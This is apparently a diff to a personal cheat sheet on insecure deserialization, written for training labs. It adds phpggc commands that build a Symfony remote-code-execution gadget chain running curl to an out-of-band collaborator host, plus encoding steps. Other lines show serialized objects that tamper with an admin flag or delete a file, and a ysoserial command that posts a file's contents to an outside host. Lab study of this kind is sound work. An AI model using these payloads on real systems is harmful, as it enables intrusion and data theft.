@@ -677,6 +677,23 @@ O:4:"User":2:{s:8:"username";s:6:"carlos";s:5:"admin";b:1;}
 O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 ```
 
+#### Framework RCE
+phpggc
+```bash
+# Base64 Payload
+phpggc Symfony/RCE4 exec 'curl http://3lpq1litlwmg1483mqhhnd3bv21xpndc.oastify.com' | base64 -w 0
+
+# URL Encoded Payload
+phpggc Symfony/RCE4 exec 'curl http://3lpq1litlwmg1483mqhhnd3bv21xpndc.oastify.com' > payload.bin
+python3 -c "import urllib.parse, sys; print(urllib.parse.quote(open(sys.argv[1], 'rb').read()))" payload.bin
+```
+
+Other frameworks:
+```
+phpggc -l
+phpggc -i symfony/rce1
+```
+
 ---
 
 ### Java Deserialization
@@ -708,3 +725,4 @@ java -jar ysoserial-all.jar CommonsBeanutils1 'curl -X POST --data-binary @/home
 3. **Check cookies** - Serialized objects often in cookies
 4. **Look for base64** - Serialized data usually base64-encoded
 5. **Try modifying values** - Change admin flag, username, etc.
+6. **Shell output strips null chars** - If a paylod includes null chars, like %00 or \x00, they are ignored in shell output. must be readed in hex o base64.
